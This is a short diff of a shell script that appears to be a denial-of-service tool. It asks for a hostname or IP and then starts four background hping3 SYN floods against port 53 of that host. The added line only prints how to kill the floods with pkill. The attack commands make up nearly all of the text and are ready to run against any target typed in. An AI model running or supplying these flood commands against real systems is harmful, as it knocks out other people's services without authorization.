@@ -46,3 +46,4 @@ fi
 echo -e "${ENTER_LINE}Hostname/IP?${END}"
 read host
 hping3 -S -p 53 $host --flood & hping3 -S -p 53 $host --flood & hping3 -S -p 53 $host --flood & hping3 -S -p 53 $host --flood & 
+echo -e "${WARNING}EXIT USING sudo pkill -9 hping3.${END}"
